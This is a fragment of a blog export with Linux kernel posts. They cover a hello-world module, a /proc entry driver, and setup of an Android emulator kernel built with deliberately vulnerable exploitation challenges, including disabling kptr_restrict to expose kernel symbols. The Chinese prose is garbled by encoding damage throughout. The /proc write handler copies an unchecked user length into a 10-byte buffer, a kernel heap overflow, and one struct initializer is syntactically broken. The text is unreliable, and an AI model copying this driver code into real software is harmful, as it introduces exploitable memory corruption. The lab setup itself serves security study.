<li><p>ç½‘ç»œæ¥å£<br>ä»»ä½•ç½‘ç»œäº‹åŠ¡éƒ½é€šè¿‡æ¥å£æ¥è¿›è¡Œï¼Œå³èƒ½å¤Ÿä¸å…¶ä»–ä¸»æœºäº¤æ¢æ•°æ®çš„è®¾å¤‡ã€‚ç½‘ç»œæ¥å£è´Ÿè´£å‘é€å’Œæ¥å—æ•°æ®æŠ¥æ–‡ï¼Œç½‘ç»œè®¾å¤‡å¸¸å¸¸è®¾è®¡æˆå¤„ç†æŠ¥æ–‡çš„å‘é€å’Œå‘é€ï¼Œè€Œéæµï¼Œå¹¶ä¸”ç½‘ç»œé©±åŠ¨å¯¹è¿æ¥ä¸€æ— æ‰€çŸ¥ï¼Œåªå¤„ç†æŠ¥æ–‡ã€‚<br>ç½‘ç»œæ¥å£ä¸åƒå­—ç¬¦è®¾å¤‡å’Œå—è®¾å¤‡ä¸€æ ·æ˜ å°„åˆ°æ–‡ä»¶ç³»ç»Ÿä¸Šï¼Œä½†æ˜¯å¯¹æ¥å£çš„å­˜å–æ–¹å¼ä»ç„¶æ˜¯é€šè¿‡åˆ†é…åç§°ï¼Œå¦‚ ens33ï¼Œå†…æ ¸ä¸ç½‘ç»œè®¾å¤‡é©±åŠ¨çš„é€šè®¯ä¸ç”¨ read å’Œ writeï¼Œå†…æ ¸è°ƒç”¨å’ŒæŠ¥æ–‡ä¼ é€’ç›¸å…³çš„å‡½æ•°</p>
</li>
</ul>
<h2 id="æ„å»ºå’Œè¿è¡Œæ¨¡å—-HELLO-WORLD"><a href="#æ„å»ºå’Œè¿è¡Œæ¨¡å—-HELLO-WORLD" class="headerlink" title="æ„å»ºå’Œè¿è¡Œæ¨¡å— HELLO WORLD"></a>æ„å»ºå’Œè¿è¡Œæ¨¡å— HELLO WORLD</h2><p>æ„å»ºæœ€ç®€å•çš„æ‰“å°æ¶ˆæ¯æ¨¡å—<br><strong>Makefile</strong></p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">ifeq ($(KERNELRELEASE),)</span><br><span class="line"></span><br><span class="line">	KERNELDIR ?= /lib/modules/$(shell uname -r)/build // å†…æ ¸æºç ç›®å½•</span><br><span class="line">	PWD := $(shell pwd) // ç¼–è¯‘ç›®å½•</span><br><span class="line"></span><br><span class="line">modules:</span><br><span class="line"><span class="meta prompt_">	$</span><span class="language-bash">(MAKE) -C $(KERNELDIR) M=$(PWD) modules</span></span><br><span class="line"></span><br><span class="line">modules_install:</span><br><span class="line"><span class="meta prompt_">	$</span><span class="language-bash">(MAKE) -C $(KERNELDIR) M=$(PWD) modules_install</span></span><br><span class="line"></span><br><span class="line">clean:</span><br><span class="line"><span class="meta prompt_">	$</span><span class="language-bash">(MAKE) -C $(KERNELDIR) M=$(PWD) clean</span></span><br><span class="line"></span><br><span class="line">else</span><br><span class="line">	obj-m := hello.o</span><br><span class="line">endif</span><br></pre></td></tr></table></figure>
<p><strong>hello.c</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">hello_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	printk(KERN_ALERT <span class="string">&quot;Hello, world\n&quot;</span>);    <span class="comment">// ä»¥ KERN_ALERT ç™»è®°æ‰“å°ä¿¡æ¯</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hello_exit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	printk(KERN_ALERT <span class="string">&quot;Goodbye, cruel world\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(hello_init); <span class="comment">// åˆå§‹åŒ–æ¨¡å—</span></span><br><span class="line">module_exit(hello_exit); <span class="comment">// æ¨å‡ºæ¨¡å—</span></span><br></pre></td></tr></table></figure>
<p>æ„å»ºã€å®‰è£…åŠå¸è½½</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make modules                      // æ„å»ºæ¨¡å—</span></span><br><span class="line">make -C /lib/modules/5.4.0-109-generic/build M=/home/embeded/LDD/fixed/misc-modules modules</span><br><span class="line">make[1]: Entering directory &#x27;/usr/src/linux-headers-5.4.0-109-generic&#x27;</span><br><span class="line">  CC [M]  /home/embeded/LDD/fixed/misc-modules/hello.o</span><br><span class="line">  Building modules, stage 2.</span><br><span class="line">  MODPOST 1 modules</span><br><span class="line">WARNING: modpost: missing MODULE_LICENSE() in /home/embeded/LDD/fixed/misc-modules/hello.o</span><br><span class="line">see include/linux/module.h for more information</span><br><span class="line">  CC [M]  /home/embeded/LDD/fixed/misc-modules/hello.mod.o</span><br><span class="line">  LD [M]  /home/embeded/LDD/fixed/misc-modules/hello.ko</span><br><span class="line">make[1]: Leaving directory &#x27;/usr/src/linux-headers-5.4.0-109-generic&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span></span></span><br><span class="line">hello.c   hello.mod    hello.mod.o  Makefile       Module.symvers</span><br><span class="line">hello.ko  hello.mod.c  hello.o      modules.order</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo insmod hello.ko              // å®‰è£…æ¨¡å—</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">lsmod | grep hello                // æŸ¥çœ‹æ¨¡å—</span></span><br><span class="line">hello                  16384  0</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo rmmod hello.ko               // å¸è½½æ¨¡å—</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">dmesg                             // æŸ¥çœ‹ KERNEL ä¿¡æ¯</span></span><br><span class="line">[412294.031622] Hello, world</span><br><span class="line">[412340.803510] Goodbye, cruel world</span><br></pre></td></tr></table></figure>

<h2 id="å†…æ ¸æ¨¡å—"><a href="#å†…æ ¸æ¨¡å—" class="headerlink" title="å†…æ ¸æ¨¡å—"></a>å†…æ ¸æ¨¡å—</h2><p><strong>å†…æ ¸æ¨¡å— vs åº”ç”¨ç¨‹åº</strong><br>æ¯ä¸ªå†…æ ¸æ¨¡å—åªæ³¨å†Œè‡ªå·±ä»¥ä¾¿äºæœåŠ¡å°†æ¥çš„è¯·æ±‚ï¼Œå…¶åˆå§‹åŒ–å‡½æ•°ç«‹åˆ»ç»ˆæ­¢</p>
<p><strong>æ¨¡å—å¯ä»¥æ³¨å†Œå“ªäº›è®¾å¤‡</strong><br>æ¨¡å—å¯ä»¥æ³¨å†Œå¾ˆå¤šä¸åŒè®¾æ–½ï¼ŒåŒ…æ‹¬ä¸åŒç±»å‹çš„è®¾å¤‡ï¼Œå¦‚ä¸²å£ã€&#x2F;proc æ–‡ä»¶ã€æ‰§è¡ŒåŸŸ</p>
<p><strong>ç”¨æˆ·ç©ºé—´æ„å»ºæ¨¡å—</strong><br>ç”¨æˆ·ç©ºé—´é©±åŠ¨çš„å¥½å¤„ï¼š</p>
<ol>
<li>æ‹¥æœ‰å®Œæ•´çš„ C åº“</li>
<li>å¯ä»¥åœ¨é©±åŠ¨ä»£ç ä¸Šè¿è¡Œå¸¸ç”¨è°ƒè¯•å™¨</li>
<li>èƒ½å¤Ÿç®€å•çš„æ€æ‰ç”¨æˆ·ç©ºé—´é©±åŠ¨</li>
<li>ç”¨æˆ·å†…å­˜å¯äº¤æ¢ï¼Œéè¿è¡Œä¸ä¼šå ç”¨ RAM</li>
</ol>
<p>å¦‚ USB é©±åŠ¨</p>
<p>ç”¨æˆ·ç©ºé—´é©±åŠ¨çš„ç¼ºç‚¹ï¼š</p>
<ol>
<li>æ— æ³•ä½¿ç”¨ä¸­æ–­</li>
<li>åªèƒ½é€šè¿‡å†…å­˜æ˜ å°„ &#x2F;dev&#x2F;mem ä½¿ç”¨ DMA </li>
<li>å“åº”æ—¶é—´æ…¢</li>
<li>é‡è¦è®¾å¤‡ä¸èƒ½åœ¨ç”¨æˆ·ç©ºé—´å¤„ç†</li>
</ol>
<h2 id="å­—ç¬¦é©±åŠ¨"><a href="#å­—ç¬¦é©±åŠ¨" class="headerlink" title="å­—ç¬¦é©±åŠ¨"></a>å­—ç¬¦é©±åŠ¨</h2><h3 id="å­—ç¬¦è®¾å¤‡æ³¨å†Œ"><a href="#å­—ç¬¦è®¾å¤‡æ³¨å†Œ" class="headerlink" title="å­—ç¬¦è®¾å¤‡æ³¨å†Œ"></a>å­—ç¬¦è®¾å¤‡æ³¨å†Œ</h3><p>è®¾å¤‡ç¼–å·</p>
<p>ä¸»è®¾å¤‡ç¼–å·æ ‡è¯†è®¾å¤‡ç›¸è¿çš„é©±åŠ¨ï¼Œå‰¯è®¾å¤‡ç¼–å·è¢«å†³å®šå¼•ç”¨å“ªä¸ªè®¾å¤‡</p>
<p>åˆ†é…å’Œé‡Šæ”¾è®¾å¤‡ç¼–å·</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">int register_chrdev_region(dev_t first, unsigned int count, const char *name)</span><br><span class="line"></span><br><span class="line">- first èµ·å§‹è®¾å¤‡ç¼–å·ï¼Œæ¬¡ç¼–å·éƒ¨åˆ†å¸¸å¸¸æ˜¯ 0</span><br><span class="line">- count è¯·æ±‚çš„è¿ç»­è®¾å¤‡ç¼–å·çš„æ€»æ•°</span><br></pre></td></tr></table></figure>

<p>æ³¨å†Œå­—ç¬¦è®¾å¤‡çš„æ–¹æ³•</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include &lt;linux/fs.h&gt;</span></span><br><span class="line">int register_chrdev(unsigned int major, const char * name, const struct file_operations *fops)</span><br><span class="line">- major ä¸»è®¾å¤‡ç¼–å·</span><br><span class="line">- name è®¾å¤‡åç§°</span><br><span class="line">- fops æ–‡ä»¶æ“ä½œå‡½æ•°</span><br><span class="line"></span><br><span class="line">å¦‚æœä¸»è®¾å¤‡å·ä¸º 0 åˆ™ä¼šåˆ†é…ä¸€ä¸ªä¸»è®¾å¤‡å·</span><br></pre></td></tr></table></figure>



<h3 id="åˆ›å»ºå¯è¯»å¯å†™-proc-å…¥å£"><a href="#åˆ›å»ºå¯è¯»å¯å†™-proc-å…¥å£" class="headerlink" title="åˆ›å»ºå¯è¯»å¯å†™ proc å…¥å£"></a>åˆ›å»ºå¯è¯»å¯å†™ proc å…¥å£</h3><figure class="highlight console"><table><tr><td class="code"><pre><span class="line">static inline struct proc_dir_entry *proc_create(</span><br><span class="line">	const char *name, umode_t mode, struct proc_dir_entry *parent,</span><br><span class="line">	const struct file_operations *proc_fops)</span><br><span class="line"></span><br><span class="line">- name // å…¥å£ç‚¹åç§°</span><br><span class="line">- mode // å…¥å£æ–‡ä»¶è®¿é—®æ¨¡å¼ï¼Œä¹Ÿå¯ä»¥ç†è§£ä¸ºæƒé™</span><br><span class="line">- parent // çˆ¶å…¥å£ç‚¹</span><br><span class="line">- proc_fops // proc å…¥å£ç‚¹æ–‡ä»¶æ“ä½œç»“æ„</span><br><span class="line"></span><br><span class="line">// æ–‡ä»¶æ“ä½œæ¥å£ï¼Œå¯ä»¥åªä½¿ç”¨éƒ¨åˆ†</span><br><span class="line">struct file_operations &#123;</span><br><span class="line">	struct module *owner;</span><br><span class="line">	loff_t (*llseek) (struct file *, loff_t, int);</span><br><span class="line">	ssize_t (*read) (struct file *, char __user *, size_t, loff_t *);</span><br><span class="line">	ssize_t (*write) (struct file *, const char __user *, size_t, loff_t *);</span><br><span class="line">	ssize_t (*aio_read) (struct kiocb *, const struct iovec *, unsigned long, loff_t);</span><br><span class="line">	ssize_t (*aio_write) (struct kiocb *, const struct iovec *, unsigned long, loff_t);</span><br><span class="line">	int (*readdir) (struct file *, void *, filldir_t);</span><br><span class="line">	unsigned int (*poll) (struct file *, struct poll_table_struct *);</span><br><span class="line">	long (*unlocked_ioctl) (struct file *, unsigned int, unsigned long);</span><br><span class="line">	long (*compat_ioctl) (struct file *, unsigned int, unsigned long);</span><br><span class="line">	int (*mmap) (struct file *, struct vm_area_struct *);</span><br><span class="line">	int (*open) (struct inode *, struct file *);</span><br><span class="line">	int (*flush) (struct file *, fl_owner_t id);</span><br><span class="line">	int (*release) (struct inode *, struct file *);</span><br><span class="line">	int (*fsync) (struct file *, loff_t, loff_t, int datasync);</span><br><span class="line">	int (*aio_fsync) (struct kiocb *, int datasync);</span><br><span class="line">	int (*fasync) (int, struct file *, int);</span><br><span class="line">	int (*lock) (struct file *, int, struct file_lock *);</span><br><span class="line">	ssize_t (*sendpage) (struct file *, struct page *, int, size_t, loff_t *, int);</span><br><span class="line">	unsigned long (*get_unmapped_area)(struct file *, unsigned long, unsigned long, unsigned long, unsigned long);</span><br><span class="line">	int (*check_flags)(int);</span><br><span class="line">	int (*flock) (struct file *, int, struct file_lock *);</span><br><span class="line">	ssize_t (*splice_write)(struct pipe_inode_info *, struct file *, loff_t *, size_t, unsigned int);</span><br><span class="line">	ssize_t (*splice_read)(struct file *, loff_t *, struct pipe_inode_info *, size_t, unsigned int);</span><br><span class="line">	int (*setlease)(struct file *, long, struct file_lock **);</span><br><span class="line">	long (*fallocate)(struct file *file, int mode, loff_t offset,</span><br><span class="line">			  loff_t len);</span><br><span class="line">	int (*show_fdinfo)(struct seq_file *m, struct file *f);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>ä»£ç </strong><br>åˆ›å»ºæ–‡ä»¶åœ¨ <code>/proc</code> ä¸‹, </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">proc_create(<span class="string">&quot;hello&quot;</span>, <span class="number">0</span>, <span class="literal">NULL</span>, &amp;proc_fops);</span><br></pre></td></tr></table></figure>

<p>æ„å»ºç›¸åº”çš„æ–‡ä»¶æ“ä½œç»“æ„</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">proc_fops</span> =</span> &#123;</span><br><span class="line">    read:    read_proc</span><br><span class="line">    write:  write_proc</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>æ·»åŠ ç›¸åº”çš„æ–‡ä»¶å¤„ç†å‡½æ•°</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">write_proc</span><span class="params">(<span class="keyword">struct</span> file* filp, <span class="type">const</span> <span class="type">char</span>* buf, <span class="type">size_t</span> count, <span class="type">loff_t</span> * offp)</span></span><br><span class="line">&#123;</span><br><span class="line">    copy_from_user(msg, buf, count);</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;In write&quot;</span>);</span><br><span class="line">    len = count;</span><br><span class="line">    temp = len;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">read_proc</span><span class="params">(<span class="keyword">struct</span> file* filp, <span class="type">char</span> *buf, <span class="type">size_t</span> count, <span class="type">loff_t</span> *offp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (count &gt; temp)</span><br><span class="line">        count = temp;</span><br><span class="line">    temp = temp-count;</span><br><span class="line">    copy_to_user(buf, msg, count);</span><br><span class="line">    <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">        temp = len;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">create_new_proc_entry</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    proc_create(<span class="string">&quot;hello&quot;</span>, <span class="number">0</span>, <span class="literal">NULL</span>, &amp;proc_fops);</span><br><span class="line">    msg = kmalloc(<span class="number">10</span>*<span class="keyword">sizeof</span>(<span class="type">char</span>), GFP_KERNEL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æ·»åŠ åˆå§‹åŒ–å’Œæ¸…é™¤æ¨¡å—å‡½æ•°</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">proc_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    create_new_proc_entry();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">proc_cleanup</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    remove_proc_entry(<span class="string">&quot;hello&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">    kfree(msg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>Kernel</category>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>AndroidKernelExploitationPlayground</title>
    <url>/2022/05/17/AndroidKernelExploitationPlayground/</url>
    <content><![CDATA[<span id="more"></span>

<p>æœ¬æ–‡ä¸»è¦å‚è€ƒ <a href="https://github.com/Fuzion24/AndroidKernelExploitationPlayground">AndroidKernelExploitationPlayground
</a></p>
<h2 id="ç³»ç»Ÿç¯å¢ƒ"><a href="#ç³»ç»Ÿç¯å¢ƒ" class="headerlink" title="ç³»ç»Ÿç¯å¢ƒ"></a>ç³»ç»Ÿç¯å¢ƒ</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">HOST OS Platform: macOS</span><br><span class="line">HOST OS Version: 10.15</span><br><span class="line">è™šæ‹Ÿæœºè½¯ä»¶ï¼šVMware Fusion 12</span><br><span class="line">OS Platform:  Linux Ubuntu</span><br><span class="line">OS Version: 18.04</span><br><span class="line">Python Version: 3.6.9 (default)</span><br></pre></td></tr></table></figure>

<h2 id="ç¯å¢ƒé…ç½®"><a href="#ç¯å¢ƒé…ç½®" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h2><h3 id="å·¥å…·è·å–"><a href="#å·¥å…·è·å–" class="headerlink" title="å·¥å…·è·å–"></a>å·¥å…·è·å–</h3><p><strong>å¹³å°ç¼–è¯‘å·¥å…·</strong></p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">git clone https://android.googlesource.com/platform/prebuilts/gcc/linux-x86/arm/arm-linux-androideabi-4.6</span><br></pre></td></tr></table></figure>
<p>ä¸‹è½½ Android sdk</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">wget http://dl.google.com/android/android-sdk_r24.4.1-linux.tgz</span><br><span class="line">tar xvf android-sdk_r24.4.1-linux.tgz</span><br><span class="line">export PATH=$(pwd)/android-sdk-linux/tools:$PATH</span><br></pre></td></tr></table></figure>
<p><strong>Patch å†…æ ¸</strong><br>æ¨¡æ‹Ÿå™¨å†…æ ¸å…è®¸è°ƒè¯•ç¬¦å·ä»¥åŠåœ¨å†…æ ¸æ ‘ä¸­æ„å»ºäº†æ¼æ´</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">git clone https://android.googlesource.com/kernel/goldfish</span><br><span class="line">git clone https://github.com/Fuzion24/AndroidKernelExploitationPlayground.git kernel_exploit_challenges</span><br><span class="line">cd goldfish/ &amp;&amp; git checkout -t origin/android-goldfish-3.4</span><br><span class="line">git am --signoff &lt; ../kernel_exploit_challenges/kernel_build/debug_symbols_and_challenges.patch</span><br><span class="line">cd .. &amp;&amp; ln -s $(pwd)/kernel_exploit_challenges/ goldfish/drivers/vulnerabilities</span><br></pre></td></tr></table></figure>

<h3 id="æ„å»ºå†…æ ¸"><a href="#æ„å»ºå†…æ ¸" class="headerlink" title="æ„å»ºå†…æ ¸"></a>æ„å»ºå†…æ ¸</h3><figure class="highlight console"><table><tr><td class="code"><pre><span class="line">// è®¾ç½®æ¶æ„ä¸º armï¼Œäº¤å‰ç¼–è¯‘ç¯å¢ƒä¸º arm-linux-androideabi-</span><br><span class="line">export ARCH=arm SUBARCH=arm CROSS_COMPILE=arm-linux-androideabi-</span><br><span class="line"></span><br><span class="line">// æ·»åŠ ç¯å¢ƒå˜é‡åˆ°æœ¬åœ°ç¼–è¯‘å·¥å…·</span><br><span class="line">export PATH=$(pwd)/arm-linux-androideabi-4.6/bin/:$PATH</span><br><span class="line"></span><br><span class="line">// æ„å»ºå†…æ ¸</span><br><span class="line">cd goldfish &amp;&amp; make goldfish_armv7_defconfig &amp;&amp; make -j4</span><br></pre></td></tr></table></figure>

<h3 id="è¿è¡Œæ¨¡æ‹Ÿå™¨"><a href="#è¿è¡Œæ¨¡æ‹Ÿå™¨" class="headerlink" title="è¿è¡Œæ¨¡æ‹Ÿå™¨"></a>è¿è¡Œæ¨¡æ‹Ÿå™¨</h3><p>é¦–å…ˆä¸‹è½½å¯¹åº”çš„å·¥å…· å’Œ ç³»ç»Ÿé•œåƒ<br><img src="https://cdn.jsdelivr.net/gh/darenfy/wiki-resources@master/202205171557031.png"><br>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬èƒ½å¤Ÿè¿è¡Œçš„ç³»ç»Ÿé•œåƒ target å’Œ tag</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">android list targets</span></span><br><span class="line">Available Android targets:</span><br><span class="line">----------</span><br><span class="line">id: 1 or &quot;android-19&quot;</span><br><span class="line">     Name: Android 4.4.2</span><br><span class="line">     Type: Platform</span><br><span class="line">     API level: 19</span><br><span class="line">     Revision: 4</span><br><span class="line">     Skins: HVGA, QVGA, WQVGA400, WQVGA432, WSVGA, WVGA800 (default), WVGA854, WXGA720, WXGA800, WXGA800-7in</span><br><span class="line"> Tag/ABIs : google_apis/armeabi-v7a</span><br></pre></td></tr></table></figure>
<p>åˆ›å»ºæ¨¡æ‹Ÿå™¨ï¼Œå¹¶è¿è¡Œ</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">goldfish$ </span><span class="language-bash">android create avd --force -t 1 --tag <span class="string">&quot;google_apis&quot;</span> -n kernel_challenges</span></span><br><span class="line">Auto-selecting single ABI armeabi-v7a</span><br><span class="line">Android 4.4.2 is a basic Android platform.</span><br><span class="line">Do you wish to create a custom hardware profile [no]</span><br><span class="line">Created AVD &#x27;kernel_challenges&#x27; based on Android 4.4.2, Google apis ARM (armeabi-v7a) processor,</span><br><span class="line">with the following hardware config:</span><br><span class="line">hw.lcd.density=240</span><br><span class="line">hw.ramSize=512</span><br><span class="line">vm.heapSize=48</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">goldfish$ </span><span class="language-bash">emulator -show-kernel -kernel <span class="built_in">arch</span>/arm/boot/zImage -avd kernel_challenges -no-boot-anim -no-skin -no-audio -no-window -qemu -monitor unix:/tmp/qemuSocket,server,nowait -s</span></span><br></pre></td></tr></table></figure>

<p><strong>æŠ¥é”™</strong></p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">emulator: error while loading shared libraries: libstdc++.so.6: cannot open shared object file: No such file or directory</span><br></pre></td></tr></table></figure>
<p>ç¼ºå°‘ 32 ä½åº“ï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤å³å¯</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">sudo apt install lib32stdc++6</span><br></pre></td></tr></table></figure>

<h3 id="è°ƒè¯•å†…æ ¸"><a href="#è°ƒè¯•å†…æ ¸" class="headerlink" title="è°ƒè¯•å†…æ ¸"></a>è°ƒè¯•å†…æ ¸</h3><p>åœ¨ goldfish æ–‡ä»¶å¤¹ä¸‹ä¹‹ä¸‹ä»¥ä¸‹å‘½ä»¤</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">goldfish$ </span><span class="language-bash">arm-linux-androideabi-gdb vmlinux</span></span><br><span class="line">GNU gdb (GDB) 7.3.1-gg2</span><br><span class="line">Copyright (C) 2011 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;</span><br><span class="line">and &quot;show warranty&quot; for details.</span><br><span class="line">This GDB was configured as &quot;--host=x86_64-linux-gnu --target=arm-linux-android&quot;.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;...</span><br><span class="line">Reading symbols from /home/embeded/Desktop/AndroidKernel/goldfish/vmlinux...done.</span><br><span class="line">(gdb) target remote :1234</span><br><span class="line">Remote debugging using :1234</span><br><span class="line">get_empty_filp () at fs/file_table.c:105</span><br><span class="line">105	&#123;</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">^C</span><br><span class="line">Program received signal SIGINT, Interrupt.</span><br><span class="line">cpu_v7_do_idle () at arch/arm/mm/proc-v7.S:74</span><br><span class="line">74		mov	pc, lr</span><br><span class="line">(gdb) </span><br></pre></td></tr></table></figure>
<p><strong>æŠ¥é”™</strong></p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">arm-linux-androideabi-gdb: error while loading shared libraries: libpython2.6.so.1.0: cannot open shared object file: No such file or directory</span><br></pre></td></tr></table></figure>
<p>ç¼ºå°‘ python2.6 ç‰ˆæœ¬åº“ï¼Œç›´æ¥ç”¨ 2.7 çš„é“¾æ¥ä¸€ä¸‹</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">sudo ln -s /usr/lib/x86_64-linux-gnu/libpython2.7.so.1.0 /usr/lib/x86_64-linux-gnu/libpython2.6.so.1.0</span><br></pre></td></tr></table></figure>
<p><strong>âš ï¸</strong><br>å¯èƒ½ä¸‹æ–­æ‰ä¹‹åçœ‹åˆ°çš„ä¸æ˜¯ <code>mov pc, lr </code>ï¼Œè¿™æ˜¯å› ä¸ºåˆ©ç”¨çš„å‡è®¾æ¡ä»¶ä¸ºæˆ‘ä»¬èƒ½å¤Ÿè·å–å†…å­˜ä¸­çš„ç¬¦å·ä¿¡æ¯ï¼Œè¿™äº›ä¿¡æ¯å‡å­˜æ”¾åœ¨ <code>/proc/kallsyms</code> æ–‡ä»¶ä¸­ï¼Œåœ¨ç°æœ‰ç‰ˆæœ¬ä¸­å†…æ ¸éƒ½ä¼šé™åˆ¶æŸ¥çœ‹ç¬¦å·ï¼Œé™åˆ¶ç¨‹åº¦ä»¥ <code>/proc/sys/kernel/kptr_restricted</code> è¡¨ç¤ºï¼Œå¦‚æœä¸º 0ï¼Œåˆ™æ— é™åˆ¶ï¼Œå¦‚æœä¸º 1ï¼Œåˆ™ root æƒé™æ— é™åˆ¶ï¼Œå¦‚æœä¸º 2ï¼Œåˆ™ä»»ä½•æƒé™éƒ½æ— æ³•è·å–ç¬¦å·ä¿¡æ¯ï¼Œåˆ©ç”¨ä»¥ä¸‹å‘½ä»¤å°†å…¶ç½®ä½åå°±å¯ä»¥çœ‹åˆ°ç¬¦å·ä¿¡æ¯</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">echo 0 &gt; /proc/sys/kernel/kptr_restrict</span><br></pre></td></tr></table></figure>

<h2 id="1-array-index"><a href="#1-array-index" class="headerlink" title="1. array_index"></a>1. array_index</h2><p>This bug is meant to mimic the sock_diag bug CVE-2013-1763</p>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3>]]></content>
      <categories>
        <category>Kernel</category>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux Kernel ä¹‹ é‚£ä¸€æŸå…‰</title>
    <url>/2022/05/14/Linux-Kernel-%E4%B9%8B-%E9%82%A3%E4%B8%80%E6%9D%9F%E5%85%89/</url>
    <content><![CDATA[<span id="more"></span>

<h2 id="å†…æ ¸æ‰§è¡Œçš„ç¬¬ä¸€æ­¥"><a href="#å†…æ ¸æ‰§è¡Œçš„ç¬¬ä¸€æ­¥" class="headerlink" title="å†…æ ¸æ‰§è¡Œçš„ç¬¬ä¸€æ­¥"></a>å†…æ ¸æ‰§è¡Œçš„ç¬¬ä¸€æ­¥</h2><h3 id="é¦–è¦æ­¥éª¤"><a href="#é¦–è¦æ­¥éª¤" class="headerlink" title="é¦–è¦æ­¥éª¤"></a>é¦–è¦æ­¥éª¤</h3><p>åœ¨è°ƒç”¨ <code>decompress_kernel</code> åï¼Œç¨‹åºè·³è½¬åˆ°è§£å‹ç¼©ä¹‹åçš„ç¨‹åºå…¥å£ç‚¹ <code>arch/x86/kernel/head_64.S</code></p>
